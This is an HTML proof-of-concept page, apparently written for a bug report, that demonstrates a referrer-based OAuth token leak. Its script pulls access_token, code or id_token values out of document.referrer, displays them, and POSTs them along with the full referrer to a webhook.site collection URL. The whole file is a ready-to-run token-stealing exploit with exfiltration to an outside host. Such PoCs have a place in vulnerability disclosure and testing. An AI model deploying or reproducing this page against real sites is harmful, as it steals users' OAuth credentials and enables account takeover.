<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Referrer Leak PoC</title>
</head>
<body>
  <h2>ğŸ” Referrer Leak PoC</h2>
  <p id="referrer">Loading referrer...</p>
  <p id="token">Looking for token...</p>

  <script>
    console.log("PoC script running...");

    // Step 1: Get referrer
    const ref = document.referrer || "No referrer detected.";
    document.getElementById("referrer").innerText = "Referrer: " + ref;
    console.log("Referrer:", ref);

    // Step 2: Match token from referrer
    const match = ref.match(/(?:access_token|code|id_token)=([^&]+)/i);
    if (match && match[1]) {
      const token = match[1];
      console.log("Extracted token:", token);
      document.getElementById("token").innerText = "ğŸš¨ Leaked Token: " + token;

      // Step 3: Send to webhook
      fetch("https://webhook.site/dfbb8dab-9ac7-4819-874f-bd3c43899a1a", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          leaked_token: token,
          full_referrer: ref,
          timestamp: new Date().toISOString()
        })
      }).then(res => {
        console.log("Webhook POST success:", res.status);
      }).catch(err => {
        console.error("Webhook POST failed:", err);
      });

    } else {
      document.getElementById("token").innerText = "âŒ No token found in referrer.";
      console.log("No token in referrer.");
    }
  </script>
</body>
</html>
